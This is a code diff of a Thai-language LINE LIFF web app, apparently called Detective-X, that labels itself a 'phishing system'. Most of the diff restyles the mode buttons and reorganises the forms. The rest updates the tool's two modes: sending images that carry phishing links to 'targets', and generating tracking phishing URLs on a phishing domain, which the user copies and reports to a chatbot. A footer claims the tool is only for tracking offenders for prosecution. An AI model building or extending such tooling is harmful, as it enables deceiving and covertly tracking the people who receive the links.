@@ -636,33 +636,66 @@
             }
         }
 
-        /* เพิ่มสไตล์สำหรับโหมดเลือก */
         .mode-switcher {
             display: flex;
             justify-content: center;
-            gap: 10px;
-            margin-bottom: 24px;
+            gap: 12px;
+            margin-bottom: 28px;
         }
         .mode-btn {
-            flex: 1;
-            padding: 12px 0;
-            border: 2px solid var(--primary-light);
-            background: #f8faff;
+            padding: 10px 22px;
+            border-radius: 22px;
+            border: 1.5px solid var(--primary-light);
+            background: #fff;
             color: var(--primary-dark);
-            border-radius: var(--border-radius);
-            font-size: 16px;
-            font-weight: 500;
+            font-weight: 600;
+            font-size: 15px;
             cursor: pointer;
             transition: var(--transition-normal);
+            outline: none;
+            box-shadow: 0 1px 4px rgba(56, 118, 191, 0.06);
         }
-        .mode-btn.active {
+        .mode-btn.active, .mode-btn:hover {
             background: linear-gradient(90deg, var(--primary-color), var(--primary-light));
             color: #fff;
             border-color: var(--primary-color);
-            box-shadow: var(--shadow-sm);
         }
         .mode-btn i {
             margin-right: 7px;
+        }
+        .mode-desc {
+            text-align: center;
+            color: var(--text-light);
+            font-size: 14px;
+            margin-bottom: 18px;
+        }
+        .link-preview-box {
+            background: #f8f9fa;
+            border: 1px dashed var(--primary-light);
+            border-radius: var(--border-radius);
+            padding: 18px 12px;
+            margin: 18px 0 0 0;
+            text-align: center;
+            word-break: break-all;
+            font-size: 15px;
+            color: var(--primary-dark);
+        }
+        .link-preview-box strong {
+            color: var(--primary-color);
+        }
+        .btn-copy-link {
+            margin-top: 10px;
+            background: var(--primary-light);
+            color: #fff;
+            border: none;
+            border-radius: 6px;
+            padding: 7px 18px;
+            font-size: 14px;
+            cursor: pointer;
+            transition: var(--transition-normal);
+        }
+        .btn-copy-link:hover {
+            background: var(--primary-color);
         }
     </style>
 </head>
@@ -677,7 +710,7 @@
         <div class="header">
             <!-- เปลี่ยนไอคอนและชื่อ -->
             <svg class="header-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512">
-                <path d="M576 216c0 141.4-114.6 256-256 256S64 357.4 64 216C64 96.5 160.5 0 280 0s216 96.5 216 216zM288 144a72 72 0 1 0 0 144 72 72 0 0 0 0-144zm0 32a40 40 0 1 1 0 80 40 40 0 0 1 0-80z"/>
+                <path d="M288 32C132.3 32 0 164.3 0 320c0 70.7 57.3 128 128 128h320c70.7 0 128-57.3 128-128C576 164.3 443.7 32 288 32zm0 64c123.7 0 224 100.3 224 224 0 52.9-43.1 96-96 96H160c-52.9 0-96-43.1-96-96 0-123.7 100.3-224 224-224zm0 64a32 32 0 1 0 0 64 32 32 0 1 0 0-64zm-80 160c0-44.2 35.8-80 80-80s80 35.8 80 80-35.8 80-80 80-80-35.8-80-80z" fill="currentColor"/>
             </svg>
             <div class="header-text">
                 <h1>ระบบฟิชชิ่ง</h1>
@@ -709,77 +742,69 @@
                 <p>กรุณารอการอนุมัติจากผู้ดูแลระบบก่อนใช้งาน หากคุณยังไม่ได้ลงทะเบียน สามารถพิมพ์คำสั่ง <strong>#regis</strong> ในแชทส่วนตัวกับบอท</p>
             </div>
             
-            <!-- โหมดเลือก -->
+            <!-- โหมดสลับ -->
             <div class="mode-switcher" id="modeSwitcher">
-                <button class="mode-btn active" id="modeImage">
-                    <i class="fas fa-image"></i> ฟิชชิ่งแบบรูปภาพ
-                </button>
-                <button class="mode-btn" id="modeLink">
-                    <i class="fas fa-link"></i> ฟิชชิ่งแบบลิงก์
-                </button>
+                <button class="mode-btn active" id="modeImageBtn"><i class="fas fa-image"></i>ฟิชชิ่งแบบรูปภาพ</button>
+                <button class="mode-btn" id="modeLinkBtn"><i class="fas fa-link"></i>ฟิชชิ่งแบบลิงก์</button>
             </div>
+            <div class="mode-desc" id="modeDesc">ส่งรูปภาพพร้อมลิงก์ฟิชชิ่งไปยังเป้าหมาย</div>
 
             <!-- ฟอร์มหลัก -->
             <div id="mainForm">
-                <div class="form-group">
-                    <label for="caseName">ชื่อเคส</label>
-                    <input type="text" id="caseName" placeholder="ระบุชื่อหรือรายละเอียดเคส" required>
-                </div>
-                
-                <div class="form-group">
-                    <label for="imageUpload">รูปภาพที่ส่งไปยังเป้าหมาย</label>
-                    <button class="btn btn-file" id="selectImageBtn">
-                        <i class="fas fa-image icon"></i> เลือกรูปภาพ
-                    </button>
-                    <input type="file" id="imageUpload" accept="image/*" style="display: none;">
-                    
-                    <div class="image-upload-container">
-                        <div class="image-preview-container">
-                            <img id="imagePreview" class="image-preview">
-                            <div id="uploadPrompt">
-                                <span>คลิกหรือลากรูปภาพมาที่นี่</span>
-                                <span style="font-size: 0.9em; opacity: 0.8;">รองรับไฟล์ JPG, PNG, GIF</span>
+                <!-- ฟอร์มรูปภาพ (default) -->
+                <div id="imageModeForm">
+                    <div class="form-group">
+                        <label for="caseName">ชื่อเคส</label>
+                        <input type="text" id="caseName" placeholder="ระบุชื่อหรือรายละเอียดเคส" required>
+                    </div>
+                    <div class="form-group">
+                        <label for="imageUpload">รูปภาพที่ส่งไปยังเป้าหมาย</label>
+                        <button class="btn btn-file" id="selectImageBtn">
+                            <i class="fas fa-image icon"></i> เลือกรูปภาพ
+                        </button>
+                        <input type="file" id="imageUpload" accept="image/*" style="display: none;">
+                        <div class="image-upload-container">
+                            <div class="image-preview-container">
+                                <img id="imagePreview" class="image-preview">
+                                <div id="uploadPrompt">
+                                    <span>คลิกหรือลากรูปภาพมาที่นี่</span>
+                                    <span style="font-size: 0.9em; opacity: 0.8;">รองรับไฟล์ JPG, PNG, GIF</span>
+                                </div>
                             </div>
                         </div>
                     </div>
-                </div>
-                
-                <div class="loader">
-                    <div class="loader-spinner"></div>
-                    <p>กำลังอัพโหลดรูปภาพ...</p>
-                </div>
-                
-                <div id="statusMessage" class="status"></div>
-                
-                <button class="btn btn-share" id="shareBtn" disabled>
-                    <i class="fas fa-paper-plane"></i> แชร์ภาพไปยังเป้าหมาย
-                </button>
-                
-                <div class="tips">
-                    <p><strong>คำแนะนำ:</strong> เลือกรูปภาพที่น่าสนใจและมีขนาดไม่ใหญ่เกินไป เพื่อให้โหลดได้อย่างรวดเร็ว</p>
-                </div>
-            </div>
-
-            <!-- ฟอร์มลิงก์ -->
-            <div id="linkForm" style="display:none;">
-                <div class="form-group">
-                    <label for="caseNameLink">ชื่อเคส</label>
-                    <input type="text" id="caseNameLink" placeholder="ระบุชื่อหรือรายละเอียดเคส" required>
-                </div>
-                <div class="form-group">
-                    <label>ลิงก์ฟิชชิ่ง</label>
-                    <div id="generatedLinkBox" style="background:#f8f9fa;border-radius:8px;padding:16px 12px;word-break:break-all;font-size:15px;color:#3876BF;display:none;margin-bottom:10px;"></div>
-                    <button class="btn btn-share" id="genLinkBtn">
-                        <i class="fas fa-link"></i> สร้างลิงก์และส่งไปแชทบอท
+                    <div class="loader">
+                        <div class="loader-spinner"></div>
+                        <p>กำลังอัพโหลดรูปภาพ...</p>
+                    </div>
+                    <div id="statusMessage" class="status"></div>
+                    <button class="btn btn-share" id="shareBtn" disabled>
+                        <i class="fas fa-paper-plane"></i> แชร์ภาพไปยังเป้าหมาย
                     </button>
+                    <div class="tips">
+                        <p><strong>คำแนะนำ:</strong> เลือกรูปภาพที่น่าสนใจและมีขนาดไม่ใหญ่เกินไป เพื่อให้โหลดได้อย่างรวดเร็ว</p>
+                    </div>
                 </div>
-                <div id="statusMessageLink" class="status"></div>
+                <!-- ฟอร์มลิงก์ -->
+                <div id="linkModeForm" style="display:none;">
+                    <div class="form-group">
+                        <label for="caseNameLink">ชื่อเคส</label>
+                        <input type="text" id="caseNameLink" placeholder="ระบุชื่อหรือรายละเอียดเคส" required>
+                    </div>
+                    <button class="btn btn-share" id="genLinkBtn" style="margin-bottom:18px;">
+                        <i class="fas fa-link"></i> สร้างลิงก์ฟิชชิ่ง
+                    </button>
+                    <div id="linkResultBox" style="display:none;">
+                        <div class="link-preview-box" id="linkPreview"></div>
+                        <button class="btn-copy-link" id="copyLinkBtn"><i class="fas fa-copy"></i> คัดลอกลิงก์</button>
+                    </div>
+                </div>
             </div>
         </div>
         
         <div class="footer">
             <p style="color: #d32f2f; font-weight: bold; margin-bottom: 10px;">⚠️ ใช้เพื่อสืบสวนติดตามตัวผู้กระทำความผิดเพื่อมาดำเนินคดีตามกฎหมายเท่านั้น</p>
-            <p>&copy; 2025 Image Phishing - Detective-X</p>
+            <p>&copy; 2025 ระบบฟิชชิ่ง - Detective-X</p>
         </div>
     </div>
 
@@ -794,7 +819,7 @@
         let isLiffInitialized = false;
         let userHasPermission = false;
         let expirationStatus = ""; // เพิ่มตัวแปรเก็บวันหมดอายุ
-        let phishingMode = "image"; // "image" หรือ "link"
+        let phishingMode = "image"; // "image" or "link"
         
         // ค่า Config สำคัญ
         const LIFF_ID = '2007231851-0DqwXxQg';
@@ -1108,6 +1133,41 @@
                 shareImage();
             });
             
+            // ฟอร์มลิงก์
+            document.getElementById('genLinkBtn').addEventListener('click', async function() {
+                if (!userHasPermission) {
+                    showStatus('คุณไม่มีสิทธิ์ใช้งานระบบนี้', false);
+                    return;
+                }
+                const caseName = document.getElementById('caseNameLink').value.trim();
+                if (!caseName) {
+                    showStatus('กรุณาระบุชื่อเคส', false);
+                    return;
+                }
+                // สร้าง trackingKey
+                const trackKey = generateTrackingKey();
+                // สร้างลิงก์ฟิชชิ่ง
+                const phishingLink = `${PHISHING_DOMAIN}?daily=${trackKey}&source=link`;
+                // แสดงลิงก์
+                document.getElementById('linkPreview').innerHTML = `<strong>${phishingLink}</strong>`;
+                document.getElementById('linkResultBox').style.display = 'block';
+                // ส่งข้อความ #genlink <ชื่อเคส> ไปยังแชทบอทส่วนตัว
+                try {
+                    await sendGenlinkMessageToBot(caseName);
+                    showStatus('ส่งคำสั่ง #genlink ไปยังแชทบอทแล้ว', true);
+                    setTimeout(() => {
+                        closeLiff();
+                    }, 1200);
+                } catch (e) {
+                    showStatus('เกิดข้อผิดพลาดในการส่งข้อความไปยังบอท: ' + e.message, false);
+                }
+            });
+            document.getElementById('copyLinkBtn').addEventListener('click', function() {
+                const link = document.getElementById('linkPreview').innerText;
+                navigator.clipboard.writeText(link);
+                showStatus('คัดลอกลิงก์แล้ว', true);
+            });
+            
             // ตรวจสอบการเปลี่ยนแปลงชื่อเคส
             document.getElementById('caseName').addEventListener('input', checkCanShare);
             
@@ -1164,55 +1224,29 @@
                 }
                 document.getElementById('imageUpload').click();
             });
-
-            // เพิ่ม event สำหรับโหมดลิงก์
-            document.getElementById('genLinkBtn').addEventListener('click', async function() {
-                if (!userHasPermission) {
-                    showStatusLink('คุณไม่มีสิทธิ์ใช้งานระบบนี้', false);
-                    return;
-                }
-                const caseName = document.getElementById('caseNameLink').value.trim();
-                if (!caseName) {
-                    showStatusLink('กรุณาระบุชื่อเคส', false);
-                    return;
-                }
-                // สร้าง trackingKey
-                const trackKey = generateTrackingKey();
-                // สร้างลิงก์ฟิชชิ่ง
-                const phishingUrl = `${PHISHING_DOMAIN}?daily=${trackKey}&case=${encodeURIComponent(caseName)}&source=link`;
-                // แสดงลิงก์
-                const linkBox = document.getElementById('generatedLinkBox');
-                linkBox.textContent = phishingUrl;
-                linkBox.style.display = 'block';
-                // ส่งข้อความ #genlink ไปแชทบอท
-                try {
-                    await sendGenlinkMessage(caseName, phishingUrl);
-                    showStatusLink('ส่งลิงก์ไปยังแชทบอทสำเร็จ', true);
-                    setTimeout(() => { closeLiff(); }, 1200);
-                } catch (e) {
-                    showStatusLink('เกิดข้อผิดพลาดในการส่งลิงก์: ' + (e.message || e), false);
-                }
-            });
         }
-
+        
         function setupModeSwitcher() {
-            const modeImageBtn = document.getElementById('modeImage');
-            const modeLinkBtn = document.getElementById('modeLink');
-            const mainForm = document.getElementById('mainForm');
-            const linkForm = document.getElementById('linkForm');
+            const modeImageBtn = document.getElementById('modeImageBtn');
+            const modeLinkBtn = document.getElementById('modeLinkBtn');
+            const imageForm = document.getElementById('imageModeForm');
+            const linkForm = document.getElementById('linkModeForm');
+            const modeDesc = document.getElementById('modeDesc');
             modeImageBtn.addEventListener('click', function() {
                 phishingMode = "image";
                 modeImageBtn.classList.add('active');
                 modeLinkBtn.classList.remove('active');
-                mainForm.style.display = '';
+                imageForm.style.display = '';
                 linkForm.style.display = 'none';
+                modeDesc.textContent = "ส่งรูปภาพพร้อมลิงก์ฟิชชิ่งไปยังเป้าหมาย";
             });
             modeLinkBtn.addEventListener('click', function() {
                 phishingMode = "link";
                 modeLinkBtn.classList.add('active');
                 modeImageBtn.classList.remove('active');
-                mainForm.style.display = 'none';
+                imageForm.style.display = 'none';
                 linkForm.style.display = '';
+                modeDesc.textContent = "สร้างลิงก์ฟิชชิ่งและส่งไปยังแชทบอทส่วนตัว";
             });
         }
         
@@ -1633,7 +1667,6 @@
 
                         // 7. รีเซ็ตแบบฟอร์ม
                         resetForm();
-                        setTimeout(() => { closeLiff(); }, 1200);
                     } else {
                         showStatus('การแชร์ถูกยกเลิก', false);
                     }
@@ -1664,15 +1697,6 @@
                 statusEl.style.display = 'none';
             }, 5000);
         }
-
-        // แสดงสถานะสำหรับโหมดลิงก์
-        function showStatusLink(message, isSuccess) {
-            const statusEl = document.getElementById('statusMessageLink');
-            statusEl.textContent = message;
-            statusEl.style.display = 'block';
-            statusEl.className = isSuccess ? 'status success' : 'status error';
-            setTimeout(() => { statusEl.style.display = 'none'; }, 4000);
-        }
         
         // รีเซ็ตแบบฟอร์มหลังแชร์สำเร็จ
         function resetForm() {
@@ -1681,7 +1705,8 @@
             document.getElementById('imagePreview').style.display = 'none';
             document.getElementById('uploadPrompt').style.display = 'block';
             document.getElementById('shareBtn').disabled = true;
-            
+            document.getElementById('caseNameLink').value = '';
+            document.getElementById('linkResultBox').style.display = 'none';
             selectedImage = null;
             trackingKey = "";
             imageUrl = "";
@@ -1692,14 +1717,18 @@
             return Date.now().toString(36) + Math.random().toString(36).substr(2, 5);
         }
 
-        // ส่งข้อความ #genlink ไปยังแชทบอทส่วนตัว
-        async function sendGenlinkMessage(caseName, phishingUrl) {
-            if (!liff.isApiAvailable('sendMessages')) throw new Error('LIFF sendMessages API ไม่พร้อมใช้งาน');
-            const msg = `#genlink ${caseName}\n${phishingUrl}`;
-            await liff.sendMessages([{ type: 'text', text: msg }]);
+        // ฟังก์ชันส่งข้อความ #genlink <ชื่อเคส> ไปยังแชทบอทส่วนตัว
+        async function sendGenlinkMessageToBot(caseName) {
+            if (!liff.isApiAvailable('sendMessages')) throw new Error('ไม่รองรับ sendMessages');
+            await liff.sendMessages([
+                {
+                    type: 'text',
+                    text: `#genlink ${caseName}`
+                }
+            ]);
         }
 
-        // ปิด LIFF หลังสำเร็จ
+        // ฟังก์ชันปิด LIFF
         function closeLiff() {
             if (liff && liff.closeWindow) liff.closeWindow();
         }
